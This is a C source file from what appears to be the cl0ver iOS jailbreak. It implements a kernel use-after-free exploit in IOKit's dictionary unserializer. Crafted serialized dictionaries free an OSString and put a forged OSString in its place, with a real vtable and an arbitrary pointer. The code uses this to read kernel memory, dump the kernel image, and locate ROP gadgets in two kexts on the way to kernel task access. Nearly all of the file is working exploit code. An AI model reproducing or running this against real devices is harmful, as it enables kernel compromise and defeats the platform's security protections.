#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
#include <stdlib.h>             // malloc
#include <string.h>             // memset, strerror

#include <mach/vm_prot.h>       // VM_PROT_EXECUTE

#include "common.h"             // ASSERT, DEBUG, PRINT_BUF, TIMER_*, MIN, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
#include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, vtab_t, dict_get_bytes
#include "offsets.h"            // off_vtab, use_new_payload, kernel_base
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW, TRY, RETHROW, FINALLY

#include "uaf_read.h"

void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
{
    DEBUG("Using UAF to read kernel bytes...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    uint32_t buflen = (uint32_t)len;
    const char str[] = "str",
               ref[] = "ref",
               sav[] = "sav";

    if(use_new_payload())
    {
        uint32_t dict_92[] =
        {
            kOSSerializeMagic,                                              // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries

            kOSSerializeString | 4,                                         // String that will get freed
            *((uint32_t*)str),
            kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
#ifdef __LP64__
            data[0],                                                        // vtable pointer (lower half)
            data[1],                                                        // vtable pointer (upper half)
            data[2],                                                        // retainCount
            data[3],                                                        // flags
            data[4],                                                        // length
            data[5],                                                        // (padding)
            data[6],                                                        // string pointer (lower half)
            data[7],                                                        // string pointer (upper half)
#else
            data[0],                                                        // vtable pointer
            data[1],                                                        // retainCount
            data[2],                                                        // flags
            data[3],                                                        // length
            data[4],                                                        // string pointer
#endif

            kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
            *((uint32_t*)ref),
            kOSSerializeObject | 1,                                         // Reference to the overwritten OSString

            kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
            *((uint32_t*)sav),                                              // from being freed before the OSString, which
            kOSSerializeEndCollection | kOSSerializeObject | 2,             // would cause a panic (because heap poisoning).
        };
        PRINT_BUF("dict_92", dict_92, sizeof(dict_92));

        usleep(10000);

        dict_get_bytes(dict_92, sizeof(dict_92), ref, buf, &buflen);
    }
    else
    {
        uint32_t dict_90[] =
        {
            kOSSerializeMagic,                                              // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries

            kOSSerializeSymbol | 4,                                         // Whatever name
            *((uint32_t*)str),
            kOSSerializeString | 4,                                         // String that will get freed
            *((uint32_t*)str),

            kOSSerializeObject | 1,                                         // Same name
            kOSSerializeBoolean | 1,                                        // Lightweight value

            kOSSerializeObject | 1,                                         // Same name again
            kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
#ifdef __LP64__
            data[0],                                                        // vtable pointer (lower half)
            data[1],                                                        // vtable pointer (upper half)
            data[2],                                                        // retainCount
            data[3],                                                        // flags
            data[4],                                                        // length
            data[5],                                                        // (padding)
            data[6],                                                        // string pointer (lower half)
            data[7],                                                        // string pointer (upper half)
#else
            data[0],                                                        // vtable pointer
            data[1],                                                        // retainCount
            data[2],                                                        // flags
            data[3],                                                        // length
            data[4],                                                        // string pointer
#endif

            kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
            *((uint32_t*)ref),
            kOSSerializeObject | 2,                                         // Reference to the overwritten OSString

            kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
            *((uint32_t*)sav),                                              // from being freed before the OSString, which
            kOSSerializeEndCollection | kOSSerializeObject | 4,             // would cause a panic (because heap poisoning).
        };
        PRINT_BUF("dict_90", dict_90, sizeof(dict_90));

        usleep(10000);

        dict_get_bytes(dict_90, sizeof(dict_90), ref, buf, &buflen);
    }

    uint32_t *ubuf = (uint32_t*)buf;
    PRINT_BUF("Fetched bytes", ubuf, buflen);
}

void uaf_read_naive(const char *addr, char *buf, size_t len)
{
    DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));

    OSString osstr =
    {
        .vtab = (vtab_t)off_vtab(),                     // actual OSString vtable
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
    };

    //bool oldverbose = verbose;
    //verbose = false;
    for(size_t off = 0; off < len; off += osstr.length)
    {
        osstr.length = len - off;
        osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
        osstr.string = &addr[off];
        uaf_get_bytes(&osstr, &buf[off], osstr.length);
    }
    //verbose = oldverbose;
}

#ifdef __LP64__
#   define OSSTR_TEMPLATE                                               \
        kOSSerializeData | sizeof(OSString),                            \
        0x0,                /* vtab/lo, will come later             */  \
        0x0,                /* vtab/hi, will come later             */  \
        100,                /* retainCount                          */  \
        kOSStringNoCopy,    /* flags                                */  \
        0x0,                /* length, will come later              */  \
        0x0,                /* (padding)                            */  \
        0x0,                /* string pointer/lo, will come later   */  \
        0x0                 /* string pointer/hi, will come later   */
#else
#   define OSSTR_TEMPLATE                                               \
        kOSSerializeData | sizeof(OSString),                            \
        0x0,                /* vtab, will come later                */  \
        100,                /* retainCount                          */  \
        kOSStringNoCopy,    /* flags                                */  \
        0x0,                /* length, will come later              */  \
        0x0                 /* string pointer, will come later      */
#endif

// Optimized kernel bytes dumping.
// Open X clients with one string each, then wait for
// async cleanup only once every X*4096 bytes.
void uaf_read(const char *addr, char *buf, size_t len)
{
#define STR_LEN (sizeof(OSString) / sizeof(uint32_t) + 1)
#define ENT_LEN_92 (24 + 3 * STR_LEN)
#define ENT_LEN_90 (29 + 3 * STR_LEN)
#define DICT_HEAD 8
#define NUM_CLIENTS 8

    static vtab_t vtab = NULL; // Initial value
    static uint32_t
    dict_92[] =
    {
        /* dict head */

        kOSSerializeMagic,                                                                          // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 20,                                    // Dict with lotsa stuff

        kOSSerializeSymbol | 7,                                                                     // "siguza"
        's' | ('i' << 8) | ('g' << 16) | ('u' << 24),                                               // This serves both as mark to check
        'z' | ('a' << 8),                                                                           // that a userclient in the registry is
        kOSSerializeNumber | 64,                                                                    // one we spawned, as well as a mapping
        0,                                                                                          // from userclient to buffer offset.
        0,

        /* dict body */

        kOSSerializeSymbol | 4,                                                                     // Allocate here, use later
        'A',
        kOSSerializeSymbol | 4,
        'B',
        kOSSerializeSymbol | 4,
        'C',
        kOSSerializeSymbol | 4,
        'D',

        kOSSerializeString | 4,                                                                     // String that will get freed
        'F',
        OSSTR_TEMPLATE,                                                                             // OSData with size of OSString

        kOSSerializeObject | 4,                                                                     // Backups to win the race
        OSSTR_TEMPLATE,
        kOSSerializeObject | 6,
        OSSTR_TEMPLATE,

        kOSSerializeSymbol | 4,                                                                     // Name to later retrieve bytes
        'R',
        kOSSerializeObject | 7,                                                                     // Reference to the overwritten OSString

        kOSSerializeSymbol | 4,                                                                     // Create references to prevent panic
        'X',
        kOSSerializeObject | 8,

        kOSSerializeSymbol | 4,
        'Y',
        kOSSerializeObject | 9,

        kOSSerializeSymbol | 4,
        'Z',
        kOSSerializeEndCollection | kOSSerializeObject | 10,
    },
    dict_90[] =
    {
        /* dict head */

        kOSSerializeMagic,                                                                          // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 20,                                    // Dict with lotsa stuff

        kOSSerializeSymbol | 7,                                                                     // "siguza"
        's' | ('i' << 8) | ('g' << 16) | ('u' << 24),                                               // This serves both as mark to check
        'z' | ('a' << 8),                                                                           // that a userclient in the registry is
        kOSSerializeNumber | 64,                                                                    // one we spawned, as well as a mapping
        0,                                                                                          // from userclient to buffer offset.
        0,

        /* dict body */

        kOSSerializeSymbol | 4,                                                                     // Allocate here, use later
        'A',
        kOSSerializeSymbol | 4,
        'B',
        kOSSerializeSymbol | 4,
        'C',
        kOSSerializeSymbol | 4,
        'D',

        kOSSerializeSymbol | 4,                                                                     // Whatever name
        'F',
        kOSSerializeString | 4,                                                                     // String that will get freed
        'F',

        kOSSerializeObject | 7,                                                                     // Same name
        kOSSerializeBoolean | 1,                                                                    // Lightweight value

        kOSSerializeObject | 7,                                                                     // Same name again
        OSSTR_TEMPLATE,                                                                             // OSData with size of OSString

        kOSSerializeObject | 4,                                                                     // Backups to win the race
        OSSTR_TEMPLATE,
        kOSSerializeObject | 6,
        OSSTR_TEMPLATE,

        kOSSerializeSymbol | 4,                                                                     // Name to later retrieve bytes
        'R',
        kOSSerializeObject | 8,                                                                     // Reference to the overwritten OSString

        kOSSerializeSymbol | 4,                                                                     // Create references to prevent panic
        'X',
        kOSSerializeObject | 10,

        kOSSerializeSymbol | 4,
        'Y',
        kOSSerializeObject | 11,

        kOSSerializeSymbol | 4,
        'Z',
        kOSSerializeEndCollection | kOSSerializeObject | 12,
    };

    DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));

    bool newpayload = use_new_payload();

    // Once
    if(vtab == NULL)
    {
        vtab = (vtab_t)off_vtab();
        uint32_t *data = (uint32_t*)&vtab;
        if(newpayload)
        {
#ifdef __LP64__
            dict_92[DICT_HEAD + 11] = dict_92[DICT_HEAD + (STR_LEN + 1) + 11] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 11] = data[0];
            dict_92[DICT_HEAD + 12] = dict_92[DICT_HEAD + (STR_LEN + 1) + 12] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 12] = data[1];
#else
            dict_92[DICT_HEAD + 11] = dict_92[DICT_HEAD + (STR_LEN + 1) + 11] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 11] = data[0];
#endif
        }
        else
        {
#ifdef __LP64__
            dict_90[DICT_HEAD + 16] = dict_90[DICT_HEAD + (STR_LEN + 1) + 16] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 16] = data[0];
            dict_90[DICT_HEAD + 17] = dict_90[DICT_HEAD + (STR_LEN + 1) + 17] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 17] = data[1];
#else
            dict_90[DICT_HEAD + 16] = dict_90[DICT_HEAD + (STR_LEN + 1) + 16] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 16] = data[0];
#endif
        }
    }

    bool oldverbose = verbose;
    verbose = false; // Madness off
    TRY
    ({
        io_connect_t client[NUM_CLIENTS];

        for(size_t off = 0; off < len;)
        {
            TIMER_START(timer);

            size_t c = 0;
            TRY
            ({
                // Offset to which we're gonna read in this iteration
                size_t it_off = off + MIN(len - off, MIG_MSG_SIZE * NUM_CLIENTS);

                verbose = oldverbose;
                DEBUG("Dumping " ADDR "-" ADDR "...", (addr_t)(addr + off), (addr_t)(addr + it_off));
                verbose = false;

                for(; c < NUM_CLIENTS && off < it_off; ++c)
                {
                    // Amount we're gonna read with this client
                    uint32_t cl_len = MIN(it_off - off, MIG_MSG_SIZE);

                    const char *ptr = &addr[off];
                    const uint32_t *dat = (const uint32_t*)&ptr;
                    uint64_t uoff = off;

                    off += cl_len;

                    if(newpayload)
                    {
                        dict_92[6] = ((uint32_t*)&uoff)[0];
                        dict_92[7] = ((uint32_t*)&uoff)[1];
#ifdef __LP64__
                        dict_92[DICT_HEAD + 15] = dict_92[DICT_HEAD + (STR_LEN + 1) + 15] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 15] = cl_len;    // length
                        dict_92[DICT_HEAD + 17] = dict_92[DICT_HEAD + (STR_LEN + 1) + 17] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 17] = dat[0];    // string ptr/lo
                        dict_92[DICT_HEAD + 18] = dict_92[DICT_HEAD + (STR_LEN + 1) + 18] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 18] = dat[1];    // string ptr/hi
#else
                        dict_92[DICT_HEAD + 14] = dict_92[DICT_HEAD + (STR_LEN + 1) + 14] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 14] = cl_len;    // length
                        dict_92[DICT_HEAD + 15] = dict_92[DICT_HEAD + (STR_LEN + 1) + 15] = dict_92[DICT_HEAD + 2 * (STR_LEN + 1) + 15] = dat[0];    // string ptr
#endif

                        client[c] = _io_spawn_client(dict_92, sizeof(dict_92));
                    }
                    else
                    {
                        dict_90[6] = ((uint32_t*)&uoff)[0];
                        dict_90[7] = ((uint32_t*)&uoff)[1];
#ifdef __LP64__
                        dict_90[DICT_HEAD + 20] = dict_90[DICT_HEAD + (STR_LEN + 1) + 20] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 20] = cl_len;    // length
                        dict_90[DICT_HEAD + 22] = dict_90[DICT_HEAD + (STR_LEN + 1) + 22] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 22] = dat[0];    // string ptr/lo
                        dict_90[DICT_HEAD + 23] = dict_90[DICT_HEAD + (STR_LEN + 1) + 23] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 23] = dat[1];    // string ptr/hi
#else
                        dict_90[DICT_HEAD + 19] = dict_90[DICT_HEAD + (STR_LEN + 1) + 19] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 19] = cl_len;    // length
                        dict_90[DICT_HEAD + 20] = dict_90[DICT_HEAD + (STR_LEN + 1) + 20] = dict_90[DICT_HEAD + 2 * (STR_LEN + 1) + 20] = dat[0];    // string ptr
#endif

                        client[c] = _io_spawn_client(dict_90, sizeof(dict_90));
                    }
                }
                io_iterator_t it = _io_iterator();
                TRY
                ({
                    size_t cl = 0;
                    io_object_t o;
                    while((o = IOIteratorNext(it)) != 0)
                    {
                        uint64_t xoff;
                        uint32_t xofflen = sizeof(xoff);
                        if(IORegistryEntryGetProperty(o, "siguza", (char*)&xoff, &xofflen) == KERN_SUCCESS)
                        {
                            // Amount we're gonna read with this client
                            uint32_t cl_len = MIN(it_off - xoff, MIG_MSG_SIZE);

                            _io_get(o, "R", &buf[xoff], &cl_len);

                            ++cl;
                        }
                        IOObjectRelease(o);
                    }
                    if(cl != c)
                    {
                        THROW("Number of parsed and retrieved dicts differ (" SIZE ", " SIZE ")", c, cl);
                    }
                })
                FINALLY
                ({
                    IOObjectRelease(it);
                })
            })
            FINALLY
            ({
                for(; c > 0; --c) // No >= because unsigned
                {
                    _io_release_client(client[c - 1]);
                }
            })

            // Async cleanup
            TIMER_SLEEP_UNTIL(timer, 50e6); // 50ms
        }
    })
    FINALLY
    ({
        verbose = oldverbose;
    })

#undef NUM_CLIENTS
#undef DICT_HEAD
#undef ENT_LEN_92
#undef ENT_LEN_90
#undef STR_LEN
}

// This is the MINIMUM header size - it may be bigger
#ifdef __LP64__
#   define MIN_HBUF_SIZE 0x2000
#else
#   define MIN_HBUF_SIZE 0x1000
#endif

void uaf_dump_kernel(file_t *file)
{
    DEBUG("Dumping kernel, this will take some time...");

    char *hbuf = malloc(MIG_MSG_SIZE),
         *newhbuf = malloc(MIG_MSG_SIZE);
    if(hbuf == NULL || newhbuf == NULL)
    {
        if(hbuf    != NULL) free(hbuf);
        if(newhbuf != NULL) free(newhbuf);
        THROW("Failed to allocate buffer (%s)", strerror(errno));
    }
    TRY
    ({
        memset(newhbuf, 0, MIG_MSG_SIZE);

        char *kbase = (char*)(kernel_base + get_kernel_slide());
        uaf_read(kbase, hbuf, MIG_MSG_SIZE);

        mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
        ASSERT(MACH_MAGIC == hdr->magic);
        memcpy(newhbuf, hbuf, sizeof(*hdr));
        mach_hdr_t *newhdr = (mach_hdr_t*)newhbuf;
        newhdr->ncmds = 0;
        newhdr->sizeofcmds = 0;

        size_t filesize = 0;
        DEBUG("Kernel segments:");
        for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
        {
            switch(cmd->cmd)
            {
                case LC_SEGMENT:
                case LC_SEGMENT_64:
                    {
                        mach_seg_t *seg = (mach_seg_t*)cmd;

                        // On 32-bit, we dump the entire kernel - it can't be used with cl0ver anyway,
                        // so we give people everything they might need for whatever it is they need it for.

                        // On 64-bit, we only need the kernel to gain tfp0 - if people want the full kernel, they
                        // can use kdump after that. So for arm64, only dump __TEXT, __DATA and parts of __PRELINK_TEXT.
#ifdef __LP64__
                        bool have = dump_full_kernel || strcmp(seg->segname, "__TEXT") == 0 || strcmp(seg->segname, "__DATA") == 0 || strcmp(seg->segname, "__PRELINK_TEXT") == 0;
                        if(have)
                        {
#endif
                            size_t size = seg->fileoff + seg->filesize;
                            filesize = size > filesize ? size : filesize;
#ifdef __LP64__
                        }
#endif
                        DEBUG("Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR "     %-15s %-15s", seg->vmaddr, seg->vmaddr + seg->vmsize, seg->fileoff, seg->fileoff + seg->filesize, seg->segname,
#ifdef __LP64__
                            !have ? "(skipped)" :
#endif
                            "");
                        for(uint32_t i = 0; i < seg->nsects; ++i)
                        {
                            mach_sec_t *sec = &( (mach_sec_t*)&seg[1] )[i];
                            DEBUG("    Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR " %s.%-*s", sec->addr, sec->addr + sec->size, (addr_t)sec->offset, sec->offset + sec->size, sec->segname, (int)(30 - strlen(sec->segname)), sec->sectname);
                        }
                    }
                default:
                    break;
            }
        }

        DEBUG("Kernel file size: 0x%lx", filesize);
        char *buf = malloc(filesize);
        if(buf == NULL)
        {
            THROW("Failed to allocate buffer (%s)", strerror(errno));
        }
        TRY
        ({
            for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
            {
                switch(cmd->cmd)
                {
                    case LC_SEGMENT:
                    case LC_SEGMENT_64:
                        {
                            mach_seg_t *seg = (mach_seg_t*)cmd;
#ifdef __LP64__
                            if(dump_full_kernel || strcmp(seg->segname, "__TEXT") == 0 || strcmp(seg->segname, "__DATA") == 0)
                            {
#endif
                                DEBUG("Dumping %s...", seg->segname);
                                size_t off = seg->fileoff < MIN_HBUF_SIZE ? MIN_HBUF_SIZE - seg->fileoff : 0; // Avoid re-dumping the header
                                uaf_read((char*)(seg->vmaddr + off), &buf[seg->fileoff + off], seg->filesize - off);
#ifdef __LP64__
                            }
                            else if(strcmp(seg->segname, "__PRELINK_TEXT") == 0)
                            {
                                DEBUG("Dissecting %s...", seg->segname);
                                // This segment is huge, so we only dump what we know we need:
                                // - IOAudioCodecs.kext for gadget_ldp_x9_add_sp_sp_0x10
                                // - AppleSEPKeyStore.kext for gadget_blr_x20_load_x22_x19
                                //
                                // We recognise the former by having a __TEXT size of 0x60000,
                                // and the latter by having __TEXT.__const before
                                // __TEXT.__cstring and a __TEXT size of 0x10000.
                                size_t found = 0;
                                uint64_t off = 0;
                                while(off < seg->filesize)
                                {
                                    mach_hdr_t *kext = (mach_hdr_t*)&buf[seg->fileoff + off];
                                    uaf_read((char*)(seg->vmaddr + off), (char*)kext, MIG_MSG_SIZE);
                                    if(kext->magic != MH_MAGIC_64)
                                    {
                                        DEBUG("    Skipping " ADDR ": not a Mach-O", seg->vmaddr + off);
                                        off += 0x4000;
                                        continue;
                                    }
                                    size_t kextsize = 0;
                                    for(mach_cmd_t *kcmd = (mach_cmd_t*)&kext[1], *kend = (mach_cmd_t*)((char*)kcmd + kext->sizeofcmds); kcmd < kend; kcmd = (mach_cmd_t*)((char*)kcmd + kcmd->cmdsize))
                                    {
                                        switch(kcmd->cmd)
                                        {
                                            case LC_SEGMENT_64:
                                                {
                                                    mach_seg_t *kseg = (mach_seg_t*)kcmd;
                                                    size_t size = kseg->fileoff + kseg->filesize;
                                                    kextsize = size > kextsize ? size : kextsize;
                                                    if
                                                    (
                                                        strcmp(kseg->segname, "__TEXT") == 0 && // we only need text segments
                                                        kext->filetype == MH_KEXT_BUNDLE        // and only for real kexts
                                                    )
                                                    {
                                                        if(kseg->fileoff == 0 && kseg->filesize == 0x60000) // IOAudioCodecs
                                                        {
                                                            DEBUG("    Found IOAudioCodecs.kext at " ADDR, kseg->vmaddr + off);
                                                            size_t o = kseg->fileoff < MIG_MSG_SIZE ? MIG_MSG_SIZE - kseg->fileoff : 0;
                                                            uaf_read((char*)(seg->vmaddr + off + kseg->fileoff + o), &((char*)kext)[kseg->fileoff + o], kseg->filesize - o);
                                                            ++found;
                                                            goto next_kext;
                                                        }
                                                        else if(kseg->fileoff == 0 && kseg->filesize == 0x10000)
                                                        {
                                                            bool saw_const = false;
                                                            // iterate over sections
                                                            struct section_64 *ksec = (struct section_64*)(kseg + 1);
                                                            for(size_t i = 0; i < kseg->nsects; ++i)
                                                            {
                                                                if(strcmp(ksec[i].sectname, "__const") == 0)
                                                                {
                                                                    saw_const = true;
                                                                }
                                                                else if(saw_const && strcmp(ksec[i].sectname, "__cstring") == 0) // AppleSEPKeyStore
                                                                {
                                                                    DEBUG("    Found AppleSEPKeyStore.kext at " ADDR, kseg->vmaddr + off);
                                                                    size_t o = kseg->fileoff < MIG_MSG_SIZE ? MIG_MSG_SIZE - kseg->fileoff : 0;
                                                                    uaf_read((char*)(seg->vmaddr + off + kseg->fileoff + o), &((char*)kext)[kseg->fileoff + o], kseg->filesize - o);
                                                                    ++found;
                                                                    goto next_kext;
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                                break;
                                        }
                                    }
                                    DEBUG("    Skipping kext at " ADDR, seg->vmaddr + off);
                                    next_kext:;
                                    if(found >= 2)
                                    {
                                        DEBUG("    Found all required kexts, skipping the rest");
                                        break;
                                    }
                                    kextsize = ((kextsize + 0x3fff) >> 14) << 14; // Round up to multiples of 0x4000
                                    off += kextsize;
                                }
                                if(found < 2)
                                {
                                    THROW("Didn't find all required kexts");
                                }
                            }
                            else // on arm64, ignore all other segments
                            {
                                DEBUG("Skipping %s...", seg->segname);
                                break;
                            }
#endif
                        }
                    case LC_UUID:
                    case LC_UNIXTHREAD:
                    case LC_VERSION_MIN_IPHONEOS:
                    case LC_FUNCTION_STARTS:
                    case LC_SOURCE_VERSION:
                        {
                            memcpy(newhbuf + sizeof(*hdr) + newhdr->sizeofcmds, cmd, cmd->cmdsize);
                            newhdr->sizeofcmds += cmd->cmdsize;
                            newhdr->ncmds++;
                        }
                        break;
                }
            }

            memcpy(buf, newhbuf, sizeof(*hdr) + hdr->sizeofcmds);
            file->buf = buf;
            file->len = filesize;
        })
        RETHROW
        ({
            free(buf);
        })
    })
    FINALLY
    ({
        free(hbuf);
        free(newhbuf);
    })
}
